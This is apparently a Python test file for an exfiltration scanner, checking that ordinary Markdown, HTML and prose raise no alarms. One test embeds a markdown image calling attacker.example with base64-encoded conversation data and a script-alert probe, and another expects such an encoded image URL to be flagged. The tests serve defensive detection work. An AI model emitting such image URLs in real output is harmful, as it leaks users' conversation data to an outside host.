"""False-positive tests: ordinary Markdown, HTML and prose must not raise alarms."""

from __future__ import annotations

import unittest

from exfil_guard import scan, summarize

B64 = "Y29udmVyc2F0aW9uPWNoYXQtOWYyYy1kZW1v"


def high_codes(text, **kwargs):
    return [finding.code for finding in scan(text, **kwargs) if finding.severity == "high"]


class FalsePositives(unittest.TestCase):
    def test_comparison_operators_are_not_html(self):
        findings = scan("Use a < b > c and 3 <= 4 for the comparison.")
        self.assertEqual(findings, [])

    def test_angle_bracket_placeholder(self):
        self.assertEqual(scan("Replace <your-name> in the template."), [])

    def test_email_autolink_is_not_a_tag(self):
        self.assertEqual(scan("Contact <foo@example.com> for access."), [])

    def test_plain_address_without_brackets(self):
        self.assertEqual(high_codes("Write to foo@example.com."), [])

    def test_plain_text_url_is_not_a_remote_load(self):
        self.assertEqual(scan("Documentation lives at https://example.com/docs."), [])

    def test_normal_markdown_link_has_no_high(self):
        self.assertEqual(high_codes("See [the docs](https://example.com/docs)."), [])

    def test_normal_markdown_image_has_no_high(self):
        self.assertEqual(high_codes("![logo](https://cdn.example.com/logo.png)"), [])

    def test_legit_emoji_and_unicode_text(self):
        self.assertEqual(scan("Great work 🎉 — 中文也可以，конечно."), [])

    def test_code_block_with_exploit_strings(self):
        text = "```\n![x](https://attacker.example/p?d=%s)\n<script>alert(1)</script>\n```\n" % B64
        self.assertEqual(scan(text), [])

    def test_inline_code_mentioning_html(self):
        self.assertEqual(scan("Use `<img src=x>` only in tests."), [])

    def test_legit_css_styling(self):
        self.assertEqual(scan('<div style="color:#334155;padding:8px">Review</div>'), [])

    def test_legit_a11y_content(self):
        findings = scan('<span class="sr-only">Skip to content</span>')
        self.assertEqual(summarize(findings)["high"], 0)

    def test_allowed_cdn_image(self):
        text = "![architecture](https://cdn.example.com/architecture.png)"
        self.assertEqual(scan(text, allow_domains=["cdn.example.com"]), [])

    def test_sha256_checksum_url(self):
        digest = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
        self.assertEqual(high_codes("![x](https://example.com/sha256/%s)" % digest), [])

    def test_version_query_parameter(self):
        self.assertEqual(high_codes("![x](https://cdn.example.com/app.js?v=1.14.2)"), [])

    def test_uuid_in_path(self):
        self.assertEqual(high_codes("![x](https://example.com/objects/6b2f4c1a-9d3e-4a21-b7c8-2d3e4f5a6b7c/raw)"), [])

    def test_markdown_table(self):
        text = "| a | b |\n| --- | --- |\n| 1 | 2 |\n"
        self.assertEqual(scan(text), [])

    def test_normal_long_english_sentence(self):
        text = "The quick brown fox jumps over the lazy dog, and the release notes mention it."
        self.assertEqual(scan(text), [])


class FalseNegativeNotes(unittest.TestCase):
    """Behaviours that are deliberately *not* claimed (documented limits)."""

    def test_short_low_entropy_query_not_flagged_high(self):
        self.assertEqual(high_codes("![x](https://example.com/a.png?size=large)"), [])

    def test_base64_lookalike_without_decode_not_high(self):
        # 16 chars, decodes to bytes that are not printable text -> no exfil claim
        self.assertNotIn("EG-EXFIL-URL", high_codes("![x](https://example.com/a.png?d=////////////////)"))
        self.assertTrue(high_codes("![x](https://example.com/a.png?d=%s)" % B64))


if __name__ == "__main__":
    unittest.main()
